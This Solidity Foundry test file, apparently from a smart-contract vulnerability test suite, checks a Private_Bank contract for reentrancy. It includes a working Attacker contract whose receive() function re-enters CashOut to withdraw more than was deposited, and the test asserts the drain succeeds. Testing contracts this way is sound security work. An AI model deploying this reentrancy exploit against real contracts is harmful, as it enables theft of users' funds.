
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyPrivate_Bank is Test {
    using stdStorage for StdStorage;
    
    Private_Bank public _contractUnderTest;
    Log public _logContract;
    
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new Private_Bank(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max / 2);
        vm.assume(attackVal % 1 ether == 0);
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }
    
    receive() external payable {}
}

contract Attacker {
    Private_Bank public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;
    
    constructor(address victimAddress) { 
        _victim = Private_Bank(victimAddress);
    }
    
    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Deposit{value: val}();
    }
    
    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        
        _victim.CashOut(val);
        
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }
    
    receive() external payable {
        if (attackCallCount < 2) {
            if (address(_victim).balance >= storedAttackVal) {
                _victim.CashOut(storedAttackVal);
            }
            attackCallCount++;
        }
    }
}
